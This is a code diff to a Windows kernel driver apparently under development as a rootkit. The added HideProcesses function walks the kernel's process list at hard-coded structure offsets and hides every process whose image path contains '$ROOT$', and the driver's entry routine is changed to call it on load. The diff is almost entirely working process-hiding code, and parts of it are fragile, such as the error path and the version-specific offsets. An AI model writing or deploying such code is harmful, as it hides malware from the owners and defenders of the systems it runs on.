@@ -89,6 +89,41 @@ int getPIDByName(wchar_t* name) {
 }
 
 
+NTSTATUS HideProcesses() {
+	PEPROCESS EP;
+	if (::PsLookupProcessByProcessId(::PsGetCurrentProcessId(), &EP) == STATUS_INVALID_PARAMETER) {
+		ObDereferenceObject(EP);
+		DbgPrint("Can't get EPROCESS");
+		return STATUS_INVALID_PARAMETER;
+	}
+	
+	PUNICODE_STRING Path = NULL;
+	int UniqueProcessId;
+	LPBYTE pUpi;
+	PLIST_ENTRY list_entry = ((LIST_ENTRY*)((LPBYTE)EP + 0x448));
+	PLIST_ENTRY Process_List_Entry = list_entry;
+
+	while (Process_List_Entry != list_entry->Blink) {
+		::SeLocateProcessImageName(EP, &Path);
+
+		if (Path->Buffer != NULL) {
+			DbgPrint("The path is: %wZ", (const wchar_t*)Path);
+			
+			if (wcsstr(Path->Buffer, L"$ROOT$") != NULL) {
+				pUpi = ((LPBYTE)Process_List_Entry) - 0x448 + 0x440;
+				UniqueProcessId = *((int*)pUpi);
+				DbgPrint("The PID is %d\n", UniqueProcessId);
+				HideProcess(UniqueProcessId);
+			}
+		}
+		Process_List_Entry = Process_List_Entry->Flink;
+		pUpi = ((LPBYTE)Process_List_Entry) - 0x448;
+		EP = ((PEPROCESS)pUpi);
+	}
+	return STATUS_SUCCESS;
+}
+
+
 
 extern "C"
 NTSTATUS
@@ -98,7 +133,8 @@ DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
 	DbgPrint("Sample driver Load called\n");
 
 
-	HideProcess(getPIDByName(L"notepad.exe"));
+	//HideProcess(getPIDByName(L"$ROOT$T.exe"));
+	HideProcesses();
 	DbgPrint("Finish");
 
 	return STATUS_SUCCESS;
